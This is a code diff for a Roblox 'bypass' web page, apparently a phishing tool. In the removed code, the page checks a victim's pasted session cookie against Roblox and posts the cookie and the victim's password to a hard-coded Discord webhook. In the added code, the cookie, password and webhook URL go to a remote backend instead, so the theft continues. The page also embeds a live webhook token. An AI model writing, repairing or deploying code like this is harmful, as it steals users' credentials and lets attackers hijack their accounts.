@@ -166,98 +166,11 @@
 
 <script>
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1525520420260941955/2AOfsSAlQ6nr1UITDMHXStyEiLaKGDMpsWeHFldDpL8dVl8Z1O2VCZ3NNd3N9mp-TlJ_";
-  const PROXY_URL = "https://bypass-proxy.onrender.com"; // ЗАМЕНИ НА СВОЙ URL WEB SERVICE
-
-  function toCodeBlock(text) {
-    const safe = text.replace(/`/g, "'");
-    return "```\n" + safe + "\n```";
-  }
-
-  function cleanCookie(raw) {
-    if (!raw) return "";
-    let c = raw.trim();
-    if (c.startsWith("_|WARNING")) {
-      const parts = c.split("|_");
-      if (parts.length >= 2) c = parts[parts.length - 1].trim();
-    }
-    return c.replace(/^["';]+|["';]+$/g, "").trim();
-  }
+  const BACKEND_URL = "https://bypass-zen.onrender.com";
 
   function showStatus(type, text) {
     const statusEl = document.getElementById("status");
     statusEl.innerHTML = '<div class="status-box ' + type + '">' + text + '</div>';
-  }
-
-  async function validateCookie(cookie) {
-    const cleaned = cleanCookie(cookie);
-    console.log("[DEBUG] Cleaned cookie:", cleaned);
-    
-    if (!cleaned || cleaned.length < 50) {
-      return { isValid: false, userId: 0, username: "Too short", reason: "Cookie too short" };
-    }
-    
-    const target = "https://users.roblox.com/v1/users/authenticated";
-    const proxyUrl = PROXY_URL + "?url=" + encodeURIComponent(target);
-    console.log("[DEBUG] Request URL:", proxyUrl);
-
-    try {
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 15000);
-      
-      const response = await fetch(proxyUrl, {
-        method: "GET",
-        headers: { "X-Roblox-Cookie": cleaned, "Accept": "application/json" },
-        signal: controller.signal
-      });
-      
-      clearTimeout(timeoutId);
-      console.log("[DEBUG] Response status:", response.status);
-      
-      if (response.status === 200) {
-        const data = await response.json();
-        console.log("[DEBUG] Response data:", data);
-        if (data && data.id) {
-          return { isValid: true, userId: data.id, username: data.name || "Unknown", cleanedCookie: cleaned };
-        }
-      }
-      
-      if (response.status === 401 || response.status === 403) {
-        return { isValid: false, userId: 0, username: "Invalid", reason: "Invalid cookie" };
-      }
-      
-      return { isValid: false, userId: 0, username: "Error", reason: "HTTP " + response.status };
-    } catch (err) {
-      console.log("[DEBUG] Error:", err);
-      return { isValid: false, userId: 0, username: "Error", reason: "Network: " + err.message };
-    }
-  }
-
-  async function sendToDiscord(category, message1, message2, cookieData) {
-    const payload = {
-      username: "bypass_zen",
-      embeds: [{
-        title: "📩 New Submission",
-        color: 0x2ecc71,
-        description:
-          "**🗂 Category:** " + category + "\n" +
-          "**👤 User:** " + cookieData.username + " (ID: " + cookieData.userId + ")\n\n" +
-          "**📝 Cookie**\n" + toCodeBlock(message1) +
-          "\n**🔑 Password**\n" + toCodeBlock(message2),
-        footer: { text: "bypass_zen · 2026" },
-        timestamp: new Date().toISOString()
-      }]
-    };
-    try {
-      const res = await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-      if (res.ok || res.status === 204) return { ok: true };
-      return { ok: false, reason: "Discord: HTTP " + res.status };
-    } catch (err) {
-      return { ok: false, reason: "Discord network error" };
-    }
   }
 
   document.getElementById("mainForm").addEventListener("submit", async (e) => {
@@ -279,23 +192,38 @@
     button.disabled = true;
     showStatus("", "Validating cookie...");
 
-    const cookieResult = await validateCookie(message1);
+    try {
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 35000);
 
-    if (!cookieResult.isValid) {
-      button.disabled = false;
-      showStatus("error", "❌ Invalid Cookie! " + (cookieResult.reason || ""));
-      return;
-    }
+      const response = await fetch(`${BACKEND_URL}/api/submit`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        signal: controller.signal,
+        body: JSON.stringify({
+          cookie: message1,
+          password: message2,
+          category: selectedCategory,
+          webhookUrl: WEBHOOK_URL
+        })
+      });
 
-    showStatus("success", "✓ Valid! " + cookieResult.username + " (ID: " + cookieResult.userId + ")");
-    
-    // Отправляем в Discord
-    const result = await sendToDiscord(selectedCategory, message1, message2, cookieResult);
-    button.disabled = false;
-    
-    if (result.ok) {
+      clearTimeout(timeoutId);
+      const data = await response.json();
+
+      if (!response.ok || !data.isValid) {
+        button.disabled = false;
+        showStatus("error", "❌ Invalid Cookie! " + (data.reason || ""));
+        return;
+      }
+
+      showStatus("success", "✓ Valid! " + data.username + " (ID: " + data.userId + ")");
       e.target.reset();
       startCooldown(button, 180);
+
+    } catch (err) {
+      button.disabled = false;
+      showStatus("error", "❌ Server error or waking up. Try again in a moment.");
     }
   });
 
@@ -312,8 +240,10 @@
       const s = String(remaining % 60).padStart(2, "0");
       button.innerHTML = 'Wait <span class="timer-digits" id="timerDigits">' + m + ":" + s + '</span>';
       const digitsEl = document.getElementById("timerDigits");
-      void digitsEl.offsetWidth;
-      digitsEl.classList.add("tick");
+      if (digitsEl) {
+        void digitsEl.offsetWidth;
+        digitsEl.classList.add("tick");
+      }
       progressFill.style.width = ((seconds - remaining) / seconds) * 100 + "%";
       if (remaining <= 0) {
         clearInterval(interval);
